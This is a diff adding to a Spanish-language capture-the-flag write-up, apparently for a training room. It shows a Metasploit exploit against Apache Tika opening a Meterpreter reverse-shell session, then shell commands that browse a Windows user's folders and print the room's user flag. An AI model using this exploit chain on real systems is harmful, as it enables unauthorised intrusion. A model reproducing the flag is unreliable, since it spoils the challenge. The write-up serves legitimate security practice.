@@ -135,7 +135,66 @@ msf exploit(windows/http/apache_tika_jp2_jscript) > exploit
 [*] Sending stage (199238 bytes) to 10.67.189.47
 [*] Meterpreter session 1 opened (192.168.138.111:4444 -> 10.67.189.47:49997) at 2026-07-04 19:19:41 -0500
 
-meterpreter > 
+Luego de entrar a meterpreter, entre a una shell de Windows. 
+
+C:\Users\CyberLens>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\CyberLens
+
+11/25/2023  07:31 AM    <DIR>          .
+11/25/2023  07:31 AM    <DIR>          ..
+06/06/2023  07:48 PM    <DIR>          3D Objects
+06/06/2023  07:48 PM    <DIR>          Contacts
+06/06/2023  07:53 PM    <DIR>          Desktop
+06/07/2023  03:09 AM    <DIR>          Documents
+06/06/2023  07:48 PM    <DIR>          Downloads
+06/06/2023  07:48 PM    <DIR>          Favorites
+06/06/2023  07:48 PM    <DIR>          Links
+06/06/2023  07:48 PM    <DIR>          Music
+06/06/2023  07:48 PM    <DIR>          Pictures
+06/06/2023  07:48 PM    <DIR>          Saved Games
+06/06/2023  07:48 PM    <DIR>          Searches
+06/06/2023  07:48 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  14,946,668,544 bytes free
+
+C:\Users\CyberLens>cd Destop
+cd Destop
+The system cannot find the path specified.
+
+C:\Users\CyberLens>cd Desktop
+cd Desktop
+
+C:\Users\CyberLens\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\CyberLens\Desktop
+
+06/06/2023  07:53 PM    <DIR>          .
+06/06/2023  07:53 PM    <DIR>          ..
+06/21/2016  03:36 PM               527 EC2 Feedback.website
+06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
+06/06/2023  07:54 PM                25 user.txt
+               3 File(s)          1,106 bytes
+               2 Dir(s)  14,946,668,544 bytes free
+
+C:\Users\CyberLens\Desktop>tyoe user.txt
+tyoe user.txt
+'tyoe' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\CyberLens\Desktop>type user.txt
+type user.txt
+THM{T1k4-CV3-f0r-7h3-w1n}
+C:\Users\CyberLens\Desktop>
+
+obtuve la primera bandera!
+
 
 
 
